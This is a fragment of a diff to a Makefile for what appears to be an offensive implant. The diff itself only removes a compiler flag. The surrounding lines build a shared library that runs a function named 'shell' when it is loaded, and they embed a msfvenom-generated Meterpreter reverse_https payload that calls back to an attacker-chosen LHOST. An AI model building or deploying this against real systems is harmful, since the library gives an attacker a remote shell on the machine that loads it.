@@ -2,7 +2,7 @@
 # run with LHOST=x in env
 FILENAME = hda1
 WAIT = 90
-CFLAGS := $(CFLAGS) -shared -Wall -Werror -pedantic -fpic -Wl,-init,shell -std=c99 -DWAIT=$(WAIT)
+CFLAGS := $(CFLAGS) -shared -Wall -Werror -fpic -Wl,-init,shell -std=c99 -DWAIT=$(WAIT)
 CC = gcc
 PAYLOAD = msfvenom -f raw -p python/meterpreter/reverse_https LHOST=$(LHOST) 2>/dev/null | sed 's/^/\#define PAYLOAD "/;s/$$/"\n/'
 # match rev.c
